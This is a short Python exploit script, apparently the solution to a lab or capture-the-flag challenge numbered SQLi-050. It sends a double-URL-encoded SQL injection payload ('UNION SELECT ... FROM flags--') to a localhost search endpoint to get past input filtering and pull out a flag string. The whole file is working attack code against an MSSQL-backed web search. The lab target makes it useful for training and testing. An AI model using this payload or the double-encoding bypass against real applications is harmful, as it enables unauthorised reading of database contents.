#!/usr/bin/env python3
"""SQLi-050: MSSQL Double URL Encoding - Exploit"""
import requests
from urllib.parse import quote

TARGET = "http://localhost:5050/search"

def double_encode(s):
    return quote(quote(s, safe=''), safe='')

def exploit():
    print("[*] SQLi-050: MSSQL Double URL Encoding")
    
    # Double encode the payload
    payload = "' UNION SELECT 1,name,value FROM flags--"
    encoded = double_encode(payload)
    
    r = requests.get(f"{TARGET}?q={encoded}")
    
    if "FLAG{" in r.text:
        start = r.text.find("FLAG{")
        end = r.text.find("}", start) + 1
        print(f"[+] FLAG: {r.text[start:end]}")
    else:
        print("[-] Exploit failed")

if __name__ == "__main__":
    exploit()
